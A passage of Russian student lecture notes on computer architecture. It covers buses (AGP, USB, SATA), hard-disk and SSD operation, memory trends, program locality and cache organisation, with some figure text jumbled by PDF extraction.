называются страницей, будут потери 256 МБ.
   После такого отображения работа со всеми PCI будет происходить на максимальной
скорости.




                                           233
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




Лекция 22. Использование шин в современных
компьютерах
Примеры шин: AGP, USB, SATA
   •    AGP, 1996. Непосредственный доступ к оперативной памяти со стороны
       видеоадаптера, GART (graphics address remapping table). Была вытеснена затем
       шиной PCI.
       Была разработана для эффективного подключения мощных видеоадаптеров
       для обеспечения высокой скорости работы. Представляла различные
       усовершенствования, которые используются в совеременных компьютерах.
       Например, идея трансляции адресов памяти, которая видна со стороны устройств.
       В самом процессоре этот механизм называется виртуальной памятью.
       Технология GART (graphics address remapping table). Разберем случай
       видеоадаптера. Если надо выполнять ввод/вывод в обход процессора, напрямую
       через шину отправляя данные в память, одна операция предполагает некоторый
       протяженный непрерывный буфер. Когда этот буфер невозможно целиком
       разместить в физической памяти, в шине AGP можно соотносить куски памяти,
       видимые для видеокарты, с распределенными по разным местам кусками
       физической памяти.

   • USB, 1996.

             – Топология – звезда, к этой шине может подключаться до 127 устройств,
               разветвители, оконечные точки (15/15 + 1/1 управляющие).
             – Для этой шины допустимо горячее подключение, когда устройство
               подключается к работающему компьютеру без скачнков напряжения и
               сбоев в работе электрических цепей.
             – Поддерживает 4 типа передач: управляющие, поточные, прерывания,
               изохронныею. За счет того, что шина рассчитана на периферию, которая
               бывает разноплановая (микрофоны, накопитери, видео...).
             – Сам контроллер, который управляет работой шины USB является PCI-
               устройством. ⇒ Чтобы работать с шиной USB, надо через шину PCI
               обращаться к той или иной версии контроллера(например, Open Host
               Controller Interface), который будет обеспечивать передачу данных по тем
               линиям, которые подключены к нему.

   • Serial ATA, 2000. Использует всего 2 лини для приема/передачи. 7 физических
     проводников:



                                            234
       ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
       МАТЕМАТИКИ И КИБЕРНЕТИКИ
       МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




     • 3 линии – земля
     • 4 линии образуют 2 дифференциальные пары (прием и передача), чтобы сигнал не
     искажался во время передачи из-за внешних электромагнитных воздействий.
     Пропускная способность в разных версиях: 1.5, 3, 6 GBit/s
     Возможность горячей замены
     К типовой шине Serial ATA подключается основной носитель информации –
     магнитный накопитель на жестких дисках.


Жесткий диск
   Жесткий диск состоит из набора пластин (со специальным напылением, сохраняющим
состояние намагниченности), насаженных на общий шпиндель; считывающей головки,
закрепленной на коромысле. Коромысла соединены в гребенку. Данные, полученные
при считывании намагниченности пластин, проходят пребразования из аналогового в
цифровой сигнал, затем обрабатываются в контроллере жесткого дистка.
   Геометрия диска.

   • На каждой поверхности зафиксированная считывающая головка будет высекать
     концентрическую дорожку, с которой можно бцдет считывать информацию.
     Дорожка делится на сектора, разделенные промежутками.

   • Набор равноудаленных от шпинделя дорожек на разных пластинах образуют
                                                                        © 2021 МГУ/ВМК/СП


     цилиндр. То есть если спозиционировать гребенку с карамыслами, то
                            Геометрия диска (несколько пластин)
     комплектом магнитных головок можно последовательно считывать информацию,
     расположенную в цилиндре, не совершая механических движений кроме вращения
     пластин вокруг шпинделя.
           • Равноудаленные от шпинделя дорожки образуют цилиндр.
                                                               Цилиндр


                                  Поверхность 0
                                                                            Пластина 0
                                  Поверхность 1
                                  Поверхность 2
                                                                            Пластина 1
                                  Поверхность 3
                                  Поверхность 4
                                                                            Пластина 2
                                  Поверхность 5


                                                           Шпиндель

                                              Рис. 22.1: Устройство диска


   Емкость диска.
                                                                                                                5



                                                         235
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                        КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                             ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                              СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Разработчики выражают емкость в десятичных гигабайтах, а не обычных
     (1ГБ=109 байт). Различают десятичные (СИ) и двоичные приставки (МЭК) Разница
     растет: КБ и КиБ ≈ 2.4%, МБ и МиБ ≈ 4.9%, ТБ и ТиБ ≈ 9.95%

   • Емкость определяется различными факторами. Чем меньше удается сделать точку,
     которая стабильно хранит состояние намагниченности, тем больше плотность
     записи.

            – Плотность записи – сколько битов может быть размещене на единице длины
              дорожки(дюйме).
            – Трековая плотность (треки/дюйм – TPI): сколько треков может быть размещено
              на одном дюйме радиуса.
            – Поверхностная плотность (биты/дюймы2 ): произведение линейной плотности
              на трековую плотность

   • Cовременные диски группируют дорожки в несколько зон записи.

            – Каждая дорожка в зоне состоит из одного и того же количества секторов,
              определяемого длиной самой короткой дорожки.
            – У каждой зоны различное количество дорожек/секторов.

Итоговая емкость:
(#байт/сектор) x (среднее # сектор/дорожка) x (# дорожка/поверхность) x (#
поверхность/пластина) x (# пластина/диск)
   Работа с диском(одна пластина)
   Шпиндель непрерывно вращается на определенной скорости. Считывающая головка,
закрепленная на конце коромысла, парит над поверхностью диска на тонкой воздушной
подушке. Она может позиционироваться над любой дорожкой. Внутренность жесткого
диска заполняется специальной газовой смесью.
   Доступ к диску разбивается на несколько этапов. Пусть гребенка спозиционирована
на нужную дорожку. На дорожке расположен нужный сектор. Этот сектор считывается,
сигнал оцифровывается, компьютер преобразует этот объем информации и т.д. Чтобы
прочесть следующий сектор, надо пройти три этапа:

  1. Поиск. После считывания сектора, необходимо перепозиционировать карамысло.
     Ищется дорожка, на которой расположен нужный новый сектор.

  2. Латентность вращения. Находясь на нужной дорожке, ждем, когда диск
     докрутится до нужного сектора.

  3. Передача данных. Сектор считывается, сигнал оцифровывается и т.д.




                                            236
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
                                                                                              © 2021 МГУ/ВМК/СП




Архитектура ЭВМ и язык ассемблера
Падарян Вартан Андроникович
                             Доступ к диску – распределение времени         КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
                                                                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                  Синий сектор   Поиск Красного    Латентность      Красный сектор
                                     считан         сектора         вращения            считан



                             Передача данных        Поиск          Латентность   Передача данных
                                                                    вращения

                                      Рис. 22.2: Алгоритм чтения информации с диска                  18




   Время доступа к диску.
   • 𝑇доступа = 𝑇ср. поиск + 𝑇ср. вращения + 𝑇ср. передача

   • Время поиска (𝑇ср. поиск )
     – Время, требуемое для перемещения считывающей головки в цилиндр,
     содержащий требуемый сектор.
     – Как правило 𝑇ср. поиск занимает 3—9 мс.

   • Латентность вращения (𝑇ср. вращения )
     – Время ожидания момента, когда первый бит запрашиваемого сектора достигнет
     считывающей головки.
     – 𝑇ср. вращения = ½ × (60 с. / RPM)
     – Типичная скорость вращения – 7200 RPM. 𝑇ср. вращения ≈ 4 мс.

   • Время передачи (𝑇ср. передача )
     – Время чтения содержимого сектора.
     – 𝑇ср. передач = (1/ср. # секторов на дорожке) × (60 с. / RPM)
   Пример оценки времени доступа

   • Исходные характеристики:
     – Скорость вращения = 7200 RPM
     – Среднее время поиска = 9 мс
     – Среднее # секторов на дорожке = 400

   • Оцениваем слагаемые и общую сумму: – 𝑇ср. вращения = 1/2 x (60 с/7200 RPM) x 1000
     мс ≈ 4.17 мс – 𝑇ср. передача = 60/7200 RPM x 1/400 с/дорожка x 1000 мс ≈ 0.02 мс –
     𝑇доступа = 9 мс + 4.17 мс + 0.02 мс


                                                             237
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                          СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Выводы: – Время передачи существенно меньше остальных слагаемых. – Считать
     первый бит из сектора – «дорогая» операция, считывание остальных битов –
     «дешево». – Время доступа SRAM ≈ 4 нс для двойного слова, DRAM ≈ 60 нс ⇒
     Диск медленнее SRAM (статической памяти) в 40,000 раз, и в 2,500 раз, чем DRAM
     (динамическая память).

   Заметим, что время считывания самого сектора – самое маленькое. Самая затратная
операция – считать первый бит сектора, который был запрошен.
   Производители устанавливают на диск DRAM память и записывают туда сектора,
которые считываются с диска. При повторном обращении они уже не ищутся на диске.
Это своего рода кэширование.
   Также на дорожках определенным образом располагают сектора, чтобы прибегать к
позиционированию как можно реже.
   Логические блоки. Нумерация секторов зависит от геометрии диска.

   • Первоначальный способ задания сектора: <C, H, S>, где С – номер цилиндра, Н –
     номер считывающей головки в цилиндре, S – номер сектора.
     – В разных зонах – разное число секторов на дорожке
     – Для обращения к диску необходимо знать его геометрию, поэтому при загрузке
     компьютера во время инициализации устройств нужно было опросить жесткий
     диск, чтобы узнать его геометрию.

   • Более простой метод обращения к данным: геометрия диска скрыта в контроллере,
     который управляет работой диска. Таким образом все содержимое диска
     рассматривается как линейная последовательность логических блоков.
     Так работает ввод/вывд SATA-устройств


Ввод/вывод (блочного) SATA-устройства.
  1. Процессор запускает операцию чтения сектора. Этот запрос через фронтальные
     шины проходит в контроллер памяти. Те адреса памяти, по которым отправляется
     содержимое нужных команд, заворачиваются на управляющие регистры SATA-
     контроллера, которое является PCI-устройством.

  2. Команда с номером сектора и указанием операции записывается в регистры, а
     затем контроллер отправляет эту команду в соответствующий жесткий диск, где все
     преобразуется в тройку, отвечающую геометрии диска.
     Если запрашиваемый сектор уже считывался некоторое время назад, его
     содержимое может храниться в микросхеме DRAM-памяти диска. В таком
     случае данные можно считать из нее, а не с пластины.



                                       238
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                         КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                              ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                               СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




                                  Рис. 22.3: SATA-устройство


3. По шине SATA до контроллера доходит содержимое сектора. SATA-контроллер через
шину PCI напрямую в виде серии PCI-транзакций бии за битом в обход процессора
запишет содержимое сектора в оперативную память.
4. После завершения записи данных в память SATA-контроллер должен как-то сообщить
процессору, что все данные уже помещены в память. Для этого используется механизм
прерываний.
5. SATA-контроллер через шину PCI пишет по некоторому адресу памяти (адрес связан
с локальным контроллером прерываний вычислительного ядра) сообщение – команду
вызвать аппаратное прерывание в ядре (механизм Message Signaled Interrupts). Когда эта
информация дошла до контроллера прерываний, он фиксирует, что данные находятся в
памяти и ими можно пользоваться. Управление передается коду, который будет работать
с новыми данными.


Твердотельные диски (SSD)
   Твердотельные диски более надежные и устойчивые к встряскам.

   • Данные хранятся блоками – страницами. Размер стреницы : 512 - 4096 байт.
     Страницы сгруппированы в блоки по 32-128 страниц.

   • Данные читаются/пишутся целыми страницами.

   • Если нужно подготовить страницу для записи, ее нужно очистить. Данные
     стираются не по одной странице, а целыми блоками.


                                             239
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                      КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                           ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                            СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




   • Блок в некоторый момент вырабатывается после некоторого количества
     перезаписей. На настоящий момент от 1000 до 10000 перезаписей. Изначально
                                                                  © 2021 МГУ/ВМК/СП
     было от 100000 перезаписей.

   • Если на обычном диске чтение занимало порядка мс, то для SSD диска это время
     порядка мкс.
                                  Производительность SSD

    Последовательное чтение           250 МБ/с              Последовательная запись         170 MB/s
    Произвольное чтение               140 МБ/с              Произвольная запись             14 MB/s
    Время доступа                     30 мкс                Время старта записи 300 мкс

                                       Рис. 22.4: Характеристики
       • Причины малой скорости произвольной записи
   SSD диски       и обычные
            – Высокая          диски. Можно
                          длительность        распределять
                                         стирания    блока (обычный
                                                             ≈1 мс.) и SSD диски по
различным функциям. На SSD дисках размещаются оперативная память и приложения,
            – Запись одной страницы вызывает копирование всех
требующие высокой скорости работы, а для хранения больших объемов данных
               остальных страниц, расположенных в данном блоке
применяются накопители на магнитных дисках.
                • Выделить (найти) новый блок и стереть его содержимое
 Современные контроллеры
                • Записать страницу в новый блок
 позволяют        реализовывать
                • Скопировать остальные страницы из исходного блока
 технологию NCQ (Native
 Command Queuing). Идет
                                                                           28
 последовательность
 запросов.         Диск     эту
 последовательность
 переупорядочивает          так,
 чтобы         минимизировать
                                        Рис. 22.5: Native Command Queuing
 время ожидания вращений
 (см. рис. 22.5).
Еще одна оптимизация для случая, когда c SSD-диска данные считываются с большей
скоростью, чем шина SATA позволяет передавать. В этом случае рассматриваем
твердотельный накопитель как PCI-устройство. Через PCI-Express при достижении
определенной электрической совместимости по контактам, подключенный на разьем
NVMe диск будет закладывать данные в память ощутимо быстрее.
   Можно увидеть, что некоторые характеристики стабильно улучаются со времен, тогда
как для других характеристик уже достигнуты определенные принципиальные пределы.
   Рассмотрим хронолигию изменения тактовых частот процессора. С ростом частот
увели чивалось и энерговыделение. Мощность можно выразить следующим образом:

                                                 𝑃 ≈ 𝑓 · 𝑐 · 𝑉 2,

где f – частота, c – емкость, V – напряжение.


                                                      240
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                                                                                  © 2021 МГУ/ВМК/СПСТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                                                      КОНСПЕКТ ПОДГОТОВЛЕН
                                                                                                                          ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                                                           СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU
                                    Тенденции в развитии запоминающих устройств
                                  SRAM
                                  Метрика           1980       1985       1990        1995        2000           2005          2010          2010:1980

                                  $/МБ              19,200     2,900      320         256         100            75            60            320
                                  t доступа (нс)    300        150        35          15          3              2             1.5           200



                                  DRAM
                                  Метрика           1980       1985       1990      1995          2000           2005          2010          2010:1980

                                  $/МБ              8,000      880        100       30            1              0.1           0.06          130,000
                                  t доступа (нс)    375        200        100       70            60             50            40            9
                                  Размер (МБ)       0.064      0.256      4         16            64             2,000         8,000         125,000


                                  HDD
                                  Метрика           1980       1985       1990      1995          2000           2005          2010          2010:1980

                                  $/МБ              500        100        8         0.30          0.01           0.005   0.0003 1,600,000
                                  t доступа (мс)    87         75         28        10            8              4       3         29
                                  Размер (МБ)       1          10         160       1,000         20,000         160,000 1,500,000 1,500,000


                            Рис. 22.6: Тенденции в развитии запоминающих устройств


   Напряжение уменьшилость на порядок. Емкость связана с площадью кристалла. К
2003-му году тепло выделялось мощностью порядка 100 Вт с площади 1 см2 , что является
большой величиной. С таким тепловым потоком перестали справляться обычные системы
охлаждения. Внутри цепей возникали точки перегрева. Поэтому было принято решение
увеличивать не тактовую частоту, а количество ядер. Большая производительность                                                               © 2021 МГУ/ВМК/СП



достигалась за счет того, что несколько ядер одновременно занимаются вычислениями
                                                                         Частота ЦПУ
                                  Разработчики аппаратуры столкнулись с “Power Wall”

                                                                                                                                                   2015
                                                   1980      1990       1995     2000        2003        2005            2010         2015          
                                                                                                                                                   1980

                                                                                                                       Core i7 Core i7
                                   ЦПУ             8086      80386     Pentium   P-III       P-4         Core 2
                                                                                                                      Nehalem Haswell


                                   Частота (МГц)    1         20        150      600         3300        2000            2500         3000         3000


                                   Длительность
                                                   1000       50         6       1.6         0.3           0.5           0.4          0.25         3000
                                   такта (нс.)

                                   Количество
                                                    1         1          1        1           1            2              4            8             8
                                   ядер

                                   Эффективная
                                   длительность    1000       50         6       1.6         0.3         0.25            0.1         0.04125 24250
                                   такта (нс)


                                                             Рис. 22.7: Частота ЦПУ

над разными данными. С количеством ядер свзано время такта. Эффективное время
такта продолжает сокращаться.
   Помимо энергетической стены разработчики столкнулись cо стеной, связанной с
быстродействием памяти. Еще одним существенным разрывом является скорость работы
обычного жесткого дистка и динамической памяти, в которой хранится вся информация.
   Был предложен еще один вид энергонезависимой памяти – фазовая память.
Информация сохраняется благодаря томы, что при определенном воздействии на


                                                                                 241
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                  КОНСПЕКТ ПОДГОТОВЛЕН
                                                                               © 2021 МГУ/ВМК/СП СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                       ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                        СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU
                                     Разрыв между ЦПУ и памятью
                                                        «Power Wall»




                                                                   «Memory Wall»




                                                                                     33




                                  Рис. 22.8: Разрыв между ЦПУ и памятью


материал, являющийся резистором, можно менять его сопротивление. Таким образом
можно разградуировать сопротивление на несколько пороговых значений и сопоставить
эту величину какому-то числу. Скорость чтения была немного выше скорости SSD.


Локальность в программах
   Хорошо написанная программа имеет такое свойство как локальность.

   Основной принцип локальности: программа стремится использовать данные и
инструкции с адресами близкими (либо точно такими же) к тем, которые использовались
ранее.Она обращается к этим данным некоторый промежуток времени.

   • Временная локальность: повторные обращения

   • Пространственная локальность: в некоторый малый промежуток времени
     используются ячейки памяти с близкими адресами

   Пример 1. В цикле суммируютс элементы массива. Видно, что при выборке данных
выполняется




                                                  242
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                              КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                   ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                    СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU

                                                                                                                        © 20



     • пространственная локальность за счет
                                                                            Пример
       того, что осуществляется последовательное
       обращение к элементам массива, которые идут                  sum = 0;
       непрерывно друг за другом;                                   for (i = 0; i < n; i++)
                                                                       sum += a[i];
                                                                    return sum;
     • временная локальность так как переменная
       sum используется на каждой итерации цикла,        Рис. 22.9: Пример кода
                                        • Выборка данных
       поэтому идет обращение к одному и тому же                                       © 2021 МГУ/ВМК/СП
                                           – Последовательные обращения к    Пространственная локальнос
       месту памяти.                         элементам массива.
                                             Оценка   качества
                                               – Переменная        локальности
                                                            sum используется на Временная локальность
                                                      каждой итерации.
Выборка инструкций обладает пространственной локальностью, т.к. осуществляется
                                        • Выборка инструкций
последовательная выборка инструкций и временной
                               • Утверждение:    локальностью
                                              способность        т.к. взглядом
                                                            беглым    осуществляется
                                                                                определить
                                           – Последовательная выборка            Пространственная локальнос
повторное выполнение инструкций. характер локальности
                                             инструкции.кода является одним из
                                 необходимых
   Пример 2.1 Достигается ли в функции        навыковвыполнение
                                         sum_array_rows
                                           – Повторное   профессионального
                                                          локальность         впрограммиста.
                                                                         обращений
                                                                   инструкций          к локальность
                                                                                 Временная

массиву a?                                            цикле.
                                    • Вопрос: Достигается ли в функции sum_array_rows
                                      локальность обращений к массиву a?

                                                  int sum_array_rows(int a[M][N]) {
 - Да. На вложенном цикле                             int i, j, sum = 0;
 происходит       итерация      по
 переменной j, которая является                        for (i = 0; i < M; i++)
                                                           for (j = 0; j < N; j++)
 вторым индексом. В силу развертки                             sum += a[i][j];
 многомерных       массивов     по                     return sum;                                            36
                                                  }
 строкам, будем идти по памяти                                                                                 © 2021 МГУ/В


 последовательно.                                       Рис. 22.10: Пример кода
                                                       Еще один пример
Пример 2.2 Достигается ли в функции sum_array_cols локальность обращений к массиву
a?                             • Вопрос: достигается ли в функции sum_array_cols
                                      локальность обращений к массиву a?


 Во вложенном цикле происходит                int sum_array_cols(int a[M][N]) {
                                                  int i, j, sum = 0;
 итерация по переменной i, которая
 является первым индексом. В силу                     for (j = 0; j < N; j++)
 того, что i – первый индекс, будем                       for (i = 0; i < M; i++)
 пепемещаться по столбцам, каждый раз                         sum += a[i][j];
                                                      return sum;
 перескакивая на большое расстояние в
                                              }
 памяти. Таким образом, при выборке
 данных локальность нарушается.                         Рис. 22.11: Пример кода 2
                                                                                                                      37



                                            243
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
                                  • Вопрос: Как преобразовать      гнездо циклов, что бы проход
Архитектура ЭВМ и язык ассемблера                    КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ

Падарян Вартан Андроникович         по 3-мерному массиву   выполнялся с шагом 1 (и т.о.
                                                         ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
                                                     СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU

                                    достичь пространственной локальности)?
   Пример 3.
                                         int sum_array_3d(int a[M][N][N]) {
   Чтобы достичь пространственной
                                             int i, j, k, sum = 0;
локальности, надо, чтобы итерация
происходило по наиболее близким              for (i = 0; i < M; i++)
адресам. Для этого надо, чтобы второй            for (j = 0; j < N; j++)
                                                      for (k = 0; k < N; k++)
цикл стал самым внутренним, а цикл, в                      sum += a[k][i][j];
котором идем по первому индексу, стал        return sum;
самым внешним. ⇒ В силу правильного }
порядка   прохода   по    пространству
                                                Рис. 22.12: Пример кода 2                           38
итерации можно улучшить скорость,
которую этот кусок кода будет достигать. Это происходит из-за того, что внутри
компьютера сформирована иерархия памяти.


Иерархическая организация памяти, кэширование.
   Ряд фундаментальных свойств аппаратуры и ПО:

   • Более быстрые устройства хранения стоят дороже, имеют меньший объем и
     потребляют больше энергии.

   • Разрыв в скорости работы между ЦПУ и оперативной памятью увеличивается.

   • В хорошо написанных программах демонстрируется хорошая локальность.

Данные свойства выводят на идею иерархической организации памяти. Рассмотрим
пирамиду из разных уровней запоминающих устройств. Каждый слой, лежащий
вверху выступает в качестве кэша для того, что находится ниже. Таким образом
получаетс совмещать минимальную стоимость и максимельный объем с максимальной
призводительностью.

   Основная идея иерархии памяти.

   • Для каждого k, более быстрое, меньшее устройство на уровне k выступает как кэш
     для большего, но более медленного устройства на уровне k+1.

   • Из-за локальности программа обращается к данным на уровне k гораздо чаше чем
     к данным на уровне k+1.

   • Устройство уровня k+1 может быть более медленным → большего размера, более
     дешевым.

   ⇒ Результат: Иерархическая память – большой объем данных, стоит сопоставимо с
самой дешевой компонентой, работает с максимальной скоростью.
   Основная идея кэша.


                                           244
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                                                         КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                                              ПРОФ РЕДАКТУРУ         И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
                                                                                                                      © 2021 МГУ/ВМК/СП
Падарян Вартан Андроникович                                                                               СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU
                                                                 Иерархия памяти
                                                                       L0:
                                                                             Регистры   Регистры ЦПУ содержат машинные
                                                                                        слова извлеченные из L1 кэша

                                                                 L1:         L1 кэш
                                                                             (SRAM)         L1 кэш содержит строки кэша L2
                                  Меньше,
                                  быстрее,                 L2:
                                  дороже                                     L2 кэш
                                                                                                  L2 кэш содержит строки
                                                                             (SRAM)               извлеченные из оперативной
                                                                                                  памяти
                                                     L3:
                                                                  Оперативная память
                                  Больше,                              (DRAM)                           Оперативная память содержит
                                  медленнее,                                                            блоки извлеченные с дисков
                                  дешевле
                                               L4:                                                            Локальные диски
                                                                   Локальные диски
                                                                                                              содержат данные
                                                                                                              извлеченные из сети


                                       L5:                       Удаленные хранилища

                                                                                                                               40

                                                     Рис. 22.13: Иерархия памяти




 Кэш в компьютере работает с блоками,
 в которые сгруппированы данные. Кэш –
 небольшая, более быстрая и дорогая память,
 которая сохраняет подмножество блоков.
 Допустим в кэш есть 4 позиции. Если нужен
 какой-то блок, совершается следующая
 операция: номер блока mod 4 = остаток.
 Исходя из этого числа определяется, где
 искать этот блок в памяти.
                                                                                            Рис. 22.14: Native Command Queuing


   Если блока в кэш нет(промах), блок извлекается из памяти и затем размещается в кэше.
Правила размещения определяют, где будет находится этот блок.
   Если одно место оказывается затребовано для размещения нескольких блоков,
обращаемся к правилам замещения. Типы промахов.

   • Холодные (вынужденные) промахи. Причина – пустой кэш

   • Промахи из-за конфликтов.

            – Количество мест размещения ограничено (может быть единственным)
                  Пример: блок i уровня k+1 размещается в блоке (i mod 4) на уровне k. Те
                  блоки, у которых одинаковый остаток, у будут конфликтовать за одно место,
                  поочередно друг друга выкидывая.




                                                                                  245
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
      МАТЕМАТИКИ И КИБЕРНЕТИКИ
      МГУ ИМЕНИ М.В. ЛОМОНОСОВА
Архитектура ЭВМ и язык ассемблера                                                       КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                                                                            ПРОФ РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ
Падарян Вартан Андроникович                                                             СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU




            – Промахи из-за конфликтов возникают когда несколько блоков размещаются на
              одном и том же месте.
                  Пример: запрос блоков 0, 8, 0, 8, 0, 8, ... Будет постоянно вызывать промахи.

   • Промахи из-за нехватки емкости. Причина – используемых блоков (рабочее
     множество) больше, чем кэш может в себе вместить.


Кэш-память: способы организации.
    Кэш памяти представляет собой статическую память, в ячейках этой стстической
памяти хранятся наиболее часто используемые данные и команды, которые
задействованы в ходе выполнения.
    Процессор сперва ищет требуемые данные и код в кэше первого уровня(L1), если там
не находит, то в L2 и L3, и только потом в оперативной памяти.
    Организация кэша (S, E, B). Он разбит на несколько наборов. В каждом наборе
есть некоторое количество строк, каждая строка содержит блок. Блок – данные, которые
нужны. В строке помимо блока присутствуют служебные данные, которые позволяют
                                                                                                        © 2021 МГУ/ВМК/СП

опеределить, находится ли в кэше нужный блок, можно ли пользоваться данными.
Совокупность полезной назгузкиОрганизация   кэша
                                   и служебных    (S, E, B)
                                               данных    формируют строку.
                                                               E = 2e строк в наборе

                                                                                                набор
                                                                                              строка



                                  S = 2s
                                  наборов
                                  (sets)




                                                                                       Размер кэша:
                                                  v     tag   0 1 2        B-1         C = S x E x B байт

                                            Бит валидности                                                     48
                                                                Данные: B = 2b байт в блоке

                                                Рис. 22.15: Структура кэша

   Чтение данных. При обращении в память вырабатывается исполнительный адрес, по
которому происходит выборка данных. Этот адрес бъется на три части:
   • самые младшие разряды показывают смещение внутри блока данных;

   • средняя часть отвечает на номер набора;

   • Старшие разряды – тег.
   Определили номер набора, обращаемся к набору, ищем строку в наборе строку, тэг
которой совпадет с нашим тэгом. Нашли нужный блок.


                                                                246
      ФАКУЛЬТЕТ ВЫЧИСЛИТЕЛЬНОЙ
